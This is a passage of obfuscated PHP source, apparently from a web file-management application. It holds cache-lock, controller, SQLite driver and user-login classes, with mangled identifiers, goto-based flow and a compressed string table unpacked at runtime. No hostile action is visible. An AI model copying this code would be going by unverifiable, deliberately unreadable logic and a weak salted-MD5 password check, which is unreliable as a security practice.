$¿Å½Ü‚Î =& $_SERVER[èùÙ¹Ïö]; $«²ÆŒÑ = microtime(!0); $ÙÚŸÕÏÖ = $«²ÆŒÑ + $ˆŒ¶…ö + 0.0001; $ĞÛÔúÖª = rtrim(self::$cachePath, $¿Å½Ü‚Î[8]) . $¿Å½Ü‚Î[904] . md5($Æë‚¹„Š) . $¿Å½Ü‚Î[901]; if (file_exists($ĞÛÔúÖª) && filemtime($ĞÛÔúÖª) && filemtime($ĞÛÔúÖª) < time() - 10) { @unlink($ĞÛÔúÖª); } do { if (file_exists($ĞÛÔúÖª)) { cacheLockWait(); continue; } $Ëğıàªú = fopen($ĞÛÔúÖª, $¿Å½Ü‚Î[905]); if (!$Ëğıàªú) { return !1; } $òÏ­¿¥ = flock($Ëğıàªú, LOCK_EX | LOCK_NB); self::$caches[$Æë‚¹„Š] = array($¿Å½Ü‚Î[906] => $Ëğıàªú, $¿Å½Ü‚Î[216] => $ĞÛÔúÖª); fwrite($Ëğıàªú, $ÙÚŸÕÏÖ); clearstatcache(); if ($Ëğıàªú && $òÏ­¿¥) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÙÚŸÕÏÖ); $this->unlock($Æë‚¹„Š); return !1; } public function lockGet($™†µ‰à) { $˜Í²ÑÄ =& $_SERVER[èùÙ¹Ïö]; $‹ñ¿„Éè = rtrim(self::$cachePath, $˜Í²ÑÄ[8]) . $˜Í²ÑÄ[904] . md5($™†µ‰à) . $˜Í²ÑÄ[901]; return file_exists($‹ñ¿„Éè); } public function unlock($§¶şççÃ) { $ú…û‹ê =& $_SERVER[èùÙ¹Ïö]; $—•à¬Ş„ = self::$caches[$§¶şççÃ]; if (!$—•à¬Ş„) { return; } @flock($—•à¬Ş„[$ú…û‹ê[906]], LOCK_UN); @fclose($—•à¬Ş„[$ú…û‹ê[906]]); @unlink($—•à¬Ş„[$ú…û‹ê[216]]); unset(self::$caches[$§¶şççÃ]); } } class CacheLockRedis { public function lock($…¦è¬Ü, $üçßò£° = 10) { $€À¨£ç¦ = Cache::init(); $íÕò‘¾Å = microtime(!0) + $üçßò£°; while (microtime(!0) < $íÕò‘¾Å) { $«™¸›¼Ò = $€À¨£ç¦->get($…¦è¬Ü); if (!$«™¸›¼Ò) { $Ïç…Ş£ = $€À¨£ç¦->setLock($…¦è¬Ü, $íÕò‘¾Å, $üçßò£°); if ($Ïç…Ş£) { return !0; } } else { if ($«™¸›¼Ò < microtime(!0)) { $€À¨£ç¦->set($…¦è¬Ü, $íÕò‘¾Å, $üçßò£° * 2); if ($€À¨£ç¦->get($…¦è¬Ü) === $«™¸›¼Ò) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($àÊêšš¡) { return Cache::init()->get($àÊêšš¡); } public function unlock($Ê‹ô½Ç¯) { return Cache::init()->remove($Ê‹ô½Ç¯); } } class CacheLockMemcached { public function lock($ú™¼ó¼Ÿ, $¾‡ÒÄû€ = 0) { $ÑÆ€³³¬ = Cache::init(); $ò•Œòé“ = microtime(!0) + $¾‡ÒÄû€; while (microtime(!0) < $ò•Œòé“) { $Ğ€Î‹ûƒ = $ÑÆ€³³¬->get($ú™¼ó¼Ÿ); if (!$Ğ€Î‹ûƒ || $Ğ€Î‹ûƒ < microtime(!0)) { $®üçÙ• = $ÑÆ€³³¬->handle->add($ú™¼ó¼Ÿ, $ò•Œòé“, $¾‡ÒÄû€); if ($®üçÙ•) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ä¤›‡) { return Cache::init()->get($Ä¤›‡); } public function unlock($„ò¦¸÷Ó) { return Cache::init()->remove($„ò¦¸÷Ó); } } goto eè”ÍÊÏ“ ; A¨·“œÛÖö: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Î±Â×¦Ê =& $_SERVER[èùÙ¹Ïö]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Î±Â×¦Ê[6]] =& $config; $this->values[$Î±Â×¦Ê[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Î±Â×¦Ê[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($€¼®Âì€) { if (1 === func_num_args()) { $this->{$€¼®Âì€} = new $€¼®Âì€(); } else { $î÷‚ßõ = new ReflectionClass($€¼®Âì€); $…èŠŞÒõ = func_get_args(); array_shift($…èŠŞÒõ); $this->{$€¼®Âì€} = $î÷‚ßõ->newInstanceArgs($…èŠŞÒõ); } return $this->{$€¼®Âì€}; } public function routeBind($¼áô‹, $´¡ÍÒó“, $¥ï˜‡ğÖ = 3) { $ú£áğ¡œ =& $_SERVER[èùÙ¹Ïö]; $’—„ØêÖ = $this->in[$ú£áğ¡œ[9]]; $¼áô‹ = str_replace($ú£áğ¡œ[10], $ú£áğ¡œ[11], trim(trim($¼áô‹, $ú£áğ¡œ[8]), $ú£áğ¡œ[12])); if (!$¼áô‹ || count($’—„ØêÖ) <= $¥ï˜‡ğÖ) { return !1; } $‚‡Û£Í = !0; $ëìå ö = explode($ú£áğ¡œ[8], $¼áô‹); for ($”Æäîáä = 0; $”Æäîáä < count($ëìå ö); $”Æäîáä++) { if ($ëìå ö[$”Æäîáä] != $’—„ØêÖ[$¥ï˜‡ğÖ + $”Æäîáä]) { $‚‡Û£Í = !1; break; } } if (!$‚‡Û£Í) { return; } call_user_func_array(array($this, $´¡ÍÒó“), array()); } public function routeArgs($ˆÌãÄ¿‘ = 3) { $ÏÑ‚É—Ø = $this->in[$_SERVER[èùÙ¹Ïö][9]]; if (count($ÏÑ‚É—Ø) <= $ˆÌãÄ¿‘) { return array(); } $¼çª¸ = array(); for ($İùÑ’ƒÅ = $ˆÌãÄ¿‘; $İùÑ’ƒÅ < count($ÏÑ‚É—Ø); $İùÑ’ƒÅ += 2) { $¼çª¸[$ÏÑ‚É—Ø[$İùÑ’ƒÅ]] = $ÏÑ‚É—Ø[$İùÑ’ƒÅ + 1]; $this->in[$ÏÑ‚É—Ø[$İùÑ’ƒÅ]] = $ÏÑ‚É—Ø[$İùÑ’ƒÅ + 1]; } return $¼çª¸; } protected function assign($ıäÍ±Ö†, $õ¢ÚÂ¯×) { $this->values[$ıäÍ±Ö†] = $õ¢ÚÂ¯×; } protected function display($àÒíÅ) { ob_end_clean(); extract($this->values); require $this->tpl . $àÒíÅ; } } class DbSqliteBase extends Db { public function __construct($âôÉ¡‘Ã = '') { $•åì¢šƒ =& $_SERVER[èùÙ¹Ïö]; if (!extension_loaded($•åì¢šƒ[13])) { think_exception(think_lang($•åì¢šƒ[14]) . $•åì¢šƒ[15]); } if (!empty($âôÉ¡‘Ã)) { if (!isset($âôÉ¡‘Ã[$•åì¢šƒ[16]])) { $âôÉ¡‘Ã[$•åì¢šƒ[16]] = 438; } $this->config = $âôÉ¡‘Ã; if (empty($this->config[$•åì¢šƒ[17]])) { $this->config[$•åì¢šƒ[17]] = array(); } } } public function connect($û±’©µ¤ = '', $°Ö•® = 0) { $·ÁÆÇ² =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->linkID[$°Ö•®])) { if (empty($û±’©µ¤)) { $û±’©µ¤ = $this->config; } $”úéí¾È = !empty($û±’©µ¤[$·ÁÆÇ²[17]][$·ÁÆÇ²[18]]) ? $û±’©µ¤[$·ÁÆÇ²[17]][$·ÁÆÇ²[18]] : $this->pconnect; $µİ‰™ß÷ = $”úéí¾È ? $·ÁÆÇ²[19] : $·ÁÆÇ²[20]; $this->linkID[$°Ö•®] = $µİ‰™ß÷($û±’©µ¤[$·ÁÆÇ²[21]], $û±’©µ¤[$·ÁÆÇ²[16]]); if (!$this->linkID[$°Ö•®]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$°Ö•®], 30000); if (1 != think_config($·ÁÆÇ²[22])) { unset($this->config); } } return $this->linkID[$°Ö•®]; } public function free() { $this->queryID = null; } public function query($ç§ôùúå) { $İÈô‘¹Ç =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ç§ôùúå; if ($this->queryID) { $this->free(); } think_action_status($İÈô‘¹Ç[23], 1); think_status($İÈô‘¹Ç[24]); $this->queryID = sqlite_query($this->_linkID, $ç§ôùúå); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $º™ÑÂ = $this->getAll(); return $º™ÑÂ; } } public function execute($¾ûõ‘ĞÄ) { $ÚÓÜü–ê =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾ûõ‘ĞÄ; if ($this->queryID) { $this->free(); } think_action_status($ÚÓÜü–ê[25], 1); think_status($ÚÓÜü–ê[24]); $µä×ı¯ = sqlite_exec($this->_linkID, $¾ûõ‘ĞÄ); $this->debug(); if (!1 === $µä×ı¯) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[èùÙ¹Ïö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ì¾‡©¢Å = sqlite_query($this->_linkID, $_SERVER[èùÙ¹Ïö][27]); if (!$Ì¾‡©¢Å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $•íÒ‘Å• = sqlite_query($this->_linkID, $_SERVER[èùÙ¹Ïö][28]); if (!$•íÒ‘Å•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $•áé™‚è = array(); if ($this->numRows > 0) { for ($âæ…å¹§ = 0; $âæ…å¹§ < $this->numRows; $âæ…å¹§++) { $•áé™‚è[$âæ…å¹§] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $•áé™‚è; } public function getFields($İ¢ç¯éç) { $Ù¾‡œœ =& $_SERVER[èùÙ¹Ïö]; $Èºù¥±¬ = $this->query($Ù¾‡œœ[29] . $İ¢ç¯éç . $Ù¾‡œœ[30]); $ƒ»Úµ˜ü = array(); if ($Èºù¥±¬) { foreach ($Èºù¥±¬ as $¥ğïäÒû => $ÀÊµÇ©±) { $ƒ»Úµ˜ü[$ÀÊµÇ©±[$Ù¾‡œœ[31]]] = array($Ù¾‡œœ[32] => $ÀÊµÇ©±[$Ù¾‡œœ[31]], $Ù¾‡œœ[33] => $ÀÊµÇ©±[$Ù¾‡œœ[34]], $Ù¾‡œœ[35] => (bool) ($ÀÊµÇ©±[$Ù¾‡œœ[36]] === $Ù¾‡œœ[12]), $Ù¾‡œœ[37] => $ÀÊµÇ©±[$Ù¾‡œœ[38]], $Ù¾‡œœ[39] => strtolower($ÀÊµÇ©±[$Ù¾‡œœ[40]]) == $Ù¾‡œœ[41], $Ù¾‡œœ[42] => strtolower($ÀÊµÇ©±[$Ù¾‡œœ[43]]) == $Ù¾‡œœ[44]); } } return $ƒ»Úµ˜ü; } public function getTables($‡›ı¾ü = '') { $Ä¨´˜²ª =& $_SERVER[èùÙ¹Ïö]; $äÌë·ˆó = $this->query($Ä¨´˜²ª[45] . $Ä¨´˜²ª[46] . $Ä¨´˜²ª[47]); $×Ğ©•¥Ñ = array(); foreach ($äÌë·ˆó as $É”£–êÀ => $Òó¦õ) { $×Ğ©•¥Ñ[$É”£–êÀ] = current($Òó¦õ); } return $×Ğ©•¥Ñ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $µ€‘®É =& $_SERVER[èùÙ¹Ïö]; $è•ÍŸâÔ = sqlite_last_error($this->_linkID); $this->error = $è•ÍŸâÔ . $µ€‘®É[4] . sqlite_error_string($è•ÍŸâÔ); if ($µ€‘®É[12] != $this->queryStr) { $this->error .= LNG($µ€‘®É[48]) . $this->queryStr; } think_trace($this->error, $µ€‘®É[12], $µ€‘®É[49]); return $this->error; } public function escapeString($´À›œÔ) { return sqlite_escape_string($´À›œÔ); } public function parseLimit($Êş†ßçÌ) { $‰·¯œÕ— =& $_SERVER[èùÙ¹Ïö]; $›Õ³ºÒâ = $‰·¯œÕ—[12]; if (!empty($Êş†ßçÌ)) { $Êş†ßçÌ = explode($‰·¯œÕ—[50], $Êş†ßçÌ); if (count($Êş†ßçÌ) > 1) { $›Õ³ºÒâ .= $‰·¯œÕ—[51] . $Êş†ßçÌ[1] . $‰·¯œÕ—[52] . $Êş†ßçÌ[0] . $‰·¯œÕ—[53]; } else { $›Õ³ºÒâ .= $‰·¯œÕ—[51] . $Êş†ßçÌ[0] . $‰·¯œÕ—[53]; } } return $›Õ³ºÒâ; } } class DbSqlite3Base extends Db { public function __construct($™Á¡í³¤ = '') { $Û±Š°Ø =& $_SERVER[èùÙ¹Ïö]; if (!class_exists($Û±Š°Ø[54])) { think_exception(think_lang($Û±Š°Ø[14]) . $Û±Š°Ø[55]); } if (!empty($™Á¡í³¤)) { if (!isset($™Á¡í³¤[$Û±Š°Ø[16]])) { $™Á¡í³¤[$Û±Š°Ø[16]] = 438; } $this->config = $™Á¡í³¤; if (empty($this->config[$Û±Š°Ø[17]])) { $this->config[$Û±Š°Ø[17]] = array(); } } } public function connect($ğÛü¼èÏ = '', $½Î¤É™Š = 0) { $„ØÓÍ… =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->linkID[$½Î¤É™Š])) { if (empty($ğÛü¼èÏ)) { $ğÛü¼èÏ = $this->config; } $this->linkID[$½Î¤É™Š] = new SQLite3($ğÛü¼èÏ[$„ØÓÍ…[21]]); if (!$this->linkID[$½Î¤É™Š]) { think_exception($this->linkID[$½Î¤É™Š]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$½Î¤É™Š]->busyTimeout(30000); if (1 != think_config($„ØÓÍ…[22])) { unset($this->config); } } return $this->linkID[$½Î¤É™Š]; } public function free() { $this->queryID = null; } public function query($ñ¨ßıÃÛ) { $¡ºçõ²ë =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñ¨ßıÃÛ; if ($this->queryID) { $this->free(); } think_action_status($¡ºçõ²ë[23], 1); think_status($¡ºçõ²ë[24]); $this->queryID = $this->_linkID->query($ñ¨ßıÃÛ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ü °¬¿ = $this->getAll(); $this->numRows = count($Ü °¬¿); return $Ü °¬¿; } } public function execute($´Ü•õÊ) { $ûĞÈ¦®ô =& $_SERVER[èùÙ¹Ïö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´Ü•õÊ; if ($this->queryID) { $this->free(); } think_action_status($ûĞÈ¦®ô[25], 1); think_status($ûĞÈ¦®ô[24]); $¼îÓú¯å = $this->_linkID->exec($´Ü•õÊ); $this->debug(); if (!1 === $¼îÓú¯å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[èùÙ¹Ïö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Š¯½»È˜ = $this->_linkID->query($_SERVER[èùÙ¹Ïö][27]); if (!$Š¯½»È˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $©¡ÚÊæğ = $this->_linkID->query($_SERVER[èùÙ¹Ïö][28]); if (!$©¡ÚÊæğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Úù ïã = array(); while ($¹€È±ÃŠ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Úù ïã[] = $¹€È±ÃŠ; } $this->queryID->reset(); return $Úù ïã; } public function getFields($é»ÎëŒ) { $ÂªÔÁ¼’ =& $_SERVER[èùÙ¹Ïö]; $‚” ˆÙñ = $this->query($ÂªÔÁ¼’[29] . $é»ÎëŒ . $ÂªÔÁ¼’[30]); $”©Ó¦ü¾ = array(); if ($‚” ˆÙñ) { foreach ($‚” ˆÙñ as $ù‡¤ÚÑ => $àÄ–ƒ»Ã) { $”©Ó¦ü¾[$àÄ–ƒ»Ã[$ÂªÔÁ¼’[32]]] = array($ÂªÔÁ¼’[32] => $àÄ–ƒ»Ã[$ÂªÔÁ¼’[32]], $ÂªÔÁ¼’[33] => $àÄ–ƒ»Ã[$ÂªÔÁ¼’[33]], $ÂªÔÁ¼’[35] => (bool) ($àÄ–ƒ»Ã[$ÂªÔÁ¼’[35]] === $ÂªÔÁ¼’[12]), $ÂªÔÁ¼’[37] => $àÄ–ƒ»Ã[$ÂªÔÁ¼’[56]], $ÂªÔÁ¼’[39] => (bool) $àÄ–ƒ»Ã[$ÂªÔÁ¼’[57]], $ÂªÔÁ¼’[42] => (bool) $àÄ–ƒ»Ã[$ÂªÔÁ¼’[57]]); } } return $”©Ó¦ü¾; } public function getTables($ôğˆ¿‘ü = '') { $Ì‹é¿ =& $_SERVER[èùÙ¹Ïö]; $¸ Ûı¾  = $this->query($Ì‹é¿[45] . $Ì‹é¿[46] . $Ì‹é¿[47]); $“§õÆ¶ñ = array(); foreach ($¸ Ûı¾  as $âı¨Ÿ¥‹ => $çÂæĞ“ë) { $“§õÆ¶ñ[$âı¨Ÿ¥‹] = current($çÂæĞ“ë); } return $“§õÆ¶ñ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $õ¼å¥û =& $_SERVER[èùÙ¹Ïö]; $this->error = $this->_linkID->lastErrorMsg(); if ($õ¼å¥û[12] != $this->queryStr) { $this->error .= LNG($õ¼å¥û[48]) . $this->queryStr; } think_trace($this->error, $õ¼å¥û[12], $õ¼å¥û[49]); return $this->error; } public function escapeString($ğÄâ¹şï) { $ÓÀœ¨Äá =& $_SERVER[èùÙ¹Ïö]; if ($this->_linkID) { return $this->_linkID->escapeString($ğÄâ¹şï); } return str_ireplace($ÓÀœ¨Äá[58], $ÓÀœ¨Äá[59], $ğÄâ¹şï); } public function parseLimit($ÏÅÂÉƒ¤) { $Ìú•Â¾Š =& $_SERVER[èùÙ¹Ïö]; $×ÑÚ²† = $Ìú•Â¾Š[12]; if (!empty($ÏÅÂÉƒ¤)) { $ÏÅÂÉƒ¤ = explode($Ìú•Â¾Š[50], $ÏÅÂÉƒ¤); if (count($ÏÅÂÉƒ¤) > 1) { $×ÑÚ²† .= $Ìú•Â¾Š[51] . $ÏÅÂÉƒ¤[1] . $Ìú•Â¾Š[52] . $ÏÅÂÉƒ¤[0] . $Ìú•Â¾Š[53]; } else { $×ÑÚ²† .= $Ìú•Â¾Š[51] . $ÏÅÂÉƒ¤[0] . $Ìú•Â¾Š[53]; } } return $×ÑÚ²†; } } goto DøÉŒÒ§É¿; f–ÎÎ„íîÊ: define($_SERVER[èùÙ¹Ïö][648], $_SERVER[èùÙ¹Ïö][649]); $bdqsfiywar = $_SERVER[èùÙ¹Ïö][650]; while (strlen($bdqsfiywar) < $_SERVER[èùÙ¹Ïö][651]) { if (!$bdqsfiywar) { break; } $bdqsfiywar++; } goto dóšÁñŸ™; D¯ï×˜å¶Ò: define($_SERVER[èùÙ¹Ïö][0], $_SERVER[èùÙ¹Ïö][1]); $_SERVER[×ùÑòÉÀ] = explode($_SERVER[èùÙ¹Ïö][2], gzinflate(substr($_SERVER[èùÙ¹Ïö][3], 10, -8))); function binCheckEq($¡‘ƒÂ ¥, $Ş™‹æ›Ö) { return $¡‘ƒÂ ¥ == $Ş™‹æ›Ö; } goto AŒ™˜†¨· ; A‘ÈÁÚİÏ: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\145" => "\165\x73\145\x72\x5f\155\145\164\141", "\x6d\145\x74\x61\x46\151\x65\x6c\x64" => "\x75\163\145\162\111\104"); protected $simpleField = "\x75\163\x65\162\111\x44\x2c\156\151\x63\x6b\116\141\x6d\x65\x2c\x6e\x61\155\x65\x2c\141\x76\141\x74\x61\162\54\163\x65\170\54\163\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($éûŠ‡) { $ãî…ÜñÍ =& $_SERVER[èùÙ¹Ïö]; $Ğ½ŒÍ‰È = $ãî…ÜñÍ[2348]; return array($ãî…ÜñÍ[1972] => array($éûŠ‡[0], $Ğ½ŒÍ‰È), $ãî…ÜñÍ[1974] => array($éûŠ‡[0], $Ğ½ŒÍ‰È), $ãî…ÜñÍ[2349] => array($éûŠ‡[0], $Ğ½ŒÍ‰È)); } protected function getInfo($•Â›ø£«, $”ş²ºº° = false) { $ıÛÌòÀ = $this->getInfoSimple($•Â›ø£«); if (!is_array($ıÛÌòÀ)) { return array(); } if ($”ş²ºº°) { return $this->_getInfoApply($ıÛÌòÀ); } return $this->cacheFunctionGet($_SERVER[èùÙ¹Ïö][1976], $•Â›ø£«); } protected function getInfoFull($¿£Ï¦‡’, $ÚòÈ¡Å… = false) { $îßˆ¯Ô = $this->getInfoSimple($¿£Ï¦‡’); if (!is_array($îßˆ¯Ô)) { return array(); } if ($ÚòÈ¡Å…) { return $this->_getInfoApply($îßˆ¯Ô, !0); } return $this->cacheFunctionGet($_SERVER[èùÙ¹Ïö][2350], $¿£Ï¦‡’); } private function _getInfoApply($ó†Á¹÷ , $ëÄ¸˜½Ó = false) { $òñ¦ãá =& $_SERVER[èùÙ¹Ïö]; if (!$ó†Á¹÷ ) { return $ó†Á¹÷ ; } $¸´¶²ª§ = md5($òñ¦ãá[2351] . $ó†Á¹÷ [$òñ¦ãá[935]] . $òñ¦ãá[2352] . $ó†Á¹÷ [$òñ¦ãá[32]]); $ó†Á¹÷  = $this->_listDataApplyItem($ó†Á¹÷ ); $Â˜øËÙ = Model($òñ¦ãá[1381])->metaGet($ó†Á¹÷ [$òñ¦ãá[89]][$òñ¦ãá[183]]); $ó†Á¹÷ [$òñ¦ãá[2353]] = $¸´¶²ª§; $ó†Á¹÷ [$òñ¦ãá[89]][$òñ¦ãá[2169]] = isset($Â˜øËÙ[$òñ¦ãá[2170]]) ? $Â˜øËÙ[$òñ¦ãá[2170]] : null; if ($ëÄ¸˜½Ó) { $ó†Á¹÷ [$òñ¦ãá[509]] = $this->metaGet($ó†Á¹÷ [$òñ¦ãá[1696]]); } return $ó†Á¹÷ ; } protected function getInfoSimple($€ñê´ïñ, $æĞéîË‘ = false) { $ÓÒôç–Á =& $_SERVER[èùÙ¹Ïö]; if (!$€ñê´ïñ) { return array(); } if ($æĞéîË‘) { $İ‡€Úç = $this->where(array($ÓÒôç–Á[1696] => intval($€ñê´ïñ)))->find(); if (!is_array($İ‡€Úç)) { return array(); } $İ‡€Úç[$ÓÒôç–Á[2354]] = Action($ÓÒôç–Á[2355])->parseUrl($İ‡€Úç[$ÓÒôç–Á[2354]]); return $İ‡€Úç; } return $this->cacheFunctionGet($ÓÒôç–Á[1977], $€ñê´ïñ); } protected function getInfoSimpleOuter($—ÇÚªŒ­) { $ôÂ¶Şğï =& $_SERVER[èùÙ¹Ïö]; if (!$—ÇÚªŒ­ || $—ÇÚªŒ­ == 0) { return array($ôÂ¶Şğï[1696] => $ôÂ¶Şğï[214], $ôÂ¶Şğï[32] => $ôÂ¶Şğï[165] . LNG($ôÂ¶Şğï[2356]) . $ôÂ¶Şğï[167], $ôÂ¶Şğï[2354] => STATIC_PATH . $ôÂ¶Şğï[2357]); } $à—à×¼ = $this->cacheFunctionGet($ôÂ¶Şğï[1977], $—ÇÚªŒ­); $±×è‡úŠ = array_field_key($à—à×¼, explode($ôÂ¶Şğï[50], $this->simpleField)); if (!$±×è‡úŠ) { return array($ôÂ¶Şğï[1696] => $ôÂ¶Şğï[1236], $ôÂ¶Şğï[32] => $ôÂ¶Şğï[165] . LNG($ôÂ¶Şğï[2358]) . $ôÂ¶Şğï[167], $ôÂ¶Şğï[2354] => STATIC_PATH . $ôÂ¶Şğï[2359]); } $±×è‡úŠ[$ôÂ¶Şğï[2354]] = Action($ôÂ¶Şğï[2355])->parseUrl($±×è‡úŠ[$ôÂ¶Şğï[2354]]); return $±×è‡úŠ; } protected function groupUser($ª©Åì×¯) { } public static function errorLang($ÅˆÖå) { $àœ¸Í¬Û =& $_SERVER[èùÙ¹Ïö]; $›®™Ùè = array(self::ERROR_USER_NOT_EXISTS => $àœ¸Í¬Û[2360], self::ERROR_USER_PASSWORD_ERROR => $àœ¸Í¬Û[2361], self::ERROR_USER_EXIST_NAME => $àœ¸Í¬Û[2362], self::ERROR_USER_EXIST_PHONE => $àœ¸Í¬Û[2363], self::ERROR_USER_EXIST_EMAIL => $àœ¸Í¬Û[2364], self::ERROR_USER_LOGIN_LOCK => $àœ¸Í¬Û[2365], self::ERROR_IP_NOT_ALLOW => $àœ¸Í¬Û[2366], self::ERROR_USER_EXIST_NICKNAME => $àœ¸Í¬Û[2367]); return LNG($›®™Ùè[$ÅˆÖå]); } public function getInfoByMeta($­Î€—ûº, $ŠÇÃî”ˆ) { $·»Û½‡â =& $_SERVER[èùÙ¹Ïö]; $È„µ¸üä = Model($·»Û½‡â[2368])->where(array($·»Û½‡â[96] => $­Î€—ûº, $·»Û½‡â[420] => $ŠÇÃî”ˆ))->find(); if ($È„µ¸üä) { return $this->getInfo($È„µ¸üä[$·»Û½‡â[1696]]); } return !1; } public function userLoginCheck($Á˜¡Óİ¸, $‚¤Š ­–) { $ë®¯³¤© =& $_SERVER[èùÙ¹Ïö]; $ìƒ¬Ò½ë = $this->userLoginFind($Á˜¡Óİ¸); if (!$ìƒ¬Ò½ë) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ìƒ¬Ò½ë[$ë®¯³¤©[1696]], $‚¤Š ­–)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ìƒ¬Ò½ë[$ë®¯³¤©[1696]]); } public function userLoginFind($ò °Ù†ü) { $¼ËÌÍƒ =& $_SERVER[èùÙ¹Ïö]; $ˆ¯±ı½ = array($¼ËÌÍƒ[32] => $ò °Ù†ü, $¼ËÌÍƒ[2177] => $ò °Ù†ü, $¼ËÌÍƒ[351] => $ò °Ù†ü, $¼ËÌÍƒ[2369] => $ò °Ù†ü, $¼ËÌÍƒ[1046] => $¼ËÌÍƒ[1048]); if ($this->nickNameRpt()) { unset($ˆ¯±ı½[$¼ËÌÍƒ[2177]]); } return $this->where($ˆ¯±ı½)->find(); } public function clearCache($ú¢ÅÃ²) { $À¯ê  =& $_SERVER[èùÙ¹Ïö]; $this->cacheFunctionClear($À¯ê [1976], $ú¢ÅÃ²); $this->cacheFunctionClear($À¯ê [1977], $ú¢ÅÃ²); $this->cacheFunctionClear($À¯ê [2350], $ú¢ÅÃ²); } public function userPasswordCheck($ÖæøÕ²À, $¯àâ®ñ†) { $¡ëØÃıË =& $_SERVER[èùÙ¹Ïö]; $ºú¯È»× = $this->where(array($¡ëØÃıË[1696] => intval($ÖæøÕ²À)))->find(); $áƒé¡ÛÖ = $this->metaGet($ÖæøÕ²À); $şºÇòØ = isset($áƒé¡ÛÖ[$¡ëØÃıË[2370]]) ? $áƒé¡ÛÖ[$¡ëØÃıË[2370]] : $¡ëØÃıË[12]; if (md5($şºÇòØ . trim($¯àâ®ñ†)) !== $ºú¯È»×[$¡ëØÃıË[935]]) { return !1; } return !0; } public function userAdd($Ó“´òï€) { $‰ÔÑ…ê­ =& $_SERVER[èùÙ¹Ïö]; $Ó™Âíä = array($‰ÔÑ…ê­[464] => $Ó“´òï€[$‰ÔÑ…ê­[32]], $‰ÔÑ…ê­[2371] => $Ó“´òï€[$‰ÔÑ…ê­[1570]], $‰ÔÑ…ê­[2372] => isset($Ó“´òï€[$‰ÔÑ…ê­[351]]) ? $Ó“´òï€[$‰ÔÑ…ê­[351]] : $‰ÔÑ…ê­[12], $‰ÔÑ…ê­[2373] => isset($Ó“´òï€[$‰ÔÑ…ê­[2369]]) ? $Ó“´òï€[$‰ÔÑ…ê­[2369]] : $‰ÔÑ…ê­[12], $‰ÔÑ…ê­[2374] => isset($Ó“´òï€[$‰ÔÑ…ê­[2177]]) ? $Ó“´òï€[$‰ÔÑ…ê­[2177]] : $Ó“´òï€[$‰ÔÑ…ê­[32]], $‰ÔÑ…ê­[2375] => isset($Ó“´òï€[$‰ÔÑ…ê­[2354]]) ? $Ó“´òï€[$‰ÔÑ…ê­[2354]] : $‰ÔÑ…ê­[12], $‰ÔÑ…ê­[2376] => isset($Ó“´òï€[$‰ÔÑ…ê­[2377]]) ? $Ó“´òï€[$‰ÔÑ…ê­[2377]] : 1, $‰ÔÑ…ê­[2378] => $Ó“´òï€[$‰ÔÑ…ê­[935]], $‰ÔÑ…ê­[1978] => isset($Ó“´òï€[$‰ÔÑ…ê­[1881]]) ? $Ó“´òï€[$‰ÔÑ…ê­[1881]] : 1024 * 1024 * 20, $‰ÔÑ…ê­[1979] => 0, $‰ÔÑ…ê­[2379] => 0, $‰ÔÑ…ê­[2023] => isset($Ó“´òï€[$‰ÔÑ…ê­[790]]) ? $Ó“´òï€[$‰ÔÑ…ê­[790]] : 1); if (!empty($Ó“´òï€[$‰ÔÑ…ê­[1696]])) { $Ó™Âíä[$‰ÔÑ…ê­[1696]] = 